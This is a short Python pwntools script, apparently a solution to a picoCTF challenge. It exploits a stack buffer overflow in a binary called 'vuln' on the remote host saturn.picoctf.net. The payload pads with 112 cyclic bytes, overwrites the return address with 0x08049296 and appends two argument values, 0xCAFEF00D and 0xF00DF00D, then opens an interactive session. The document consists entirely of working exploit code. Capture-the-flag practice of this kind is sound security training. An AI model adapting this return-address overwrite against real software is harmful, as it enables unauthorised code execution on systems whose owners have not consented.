from pwn import *
file = './vuln'
#file = './b.out'
p = process(file)
p = connect('saturn.picoctf.net', 61010)

payload = cyclic(112) + p32(0x08049296)
payload += b'm'*4 + p32(0xCAFEF00D) + p32(0xF00DF00D)
#pause()
p.sendlineafter(':', payload)
p.recv()

p.interactive()
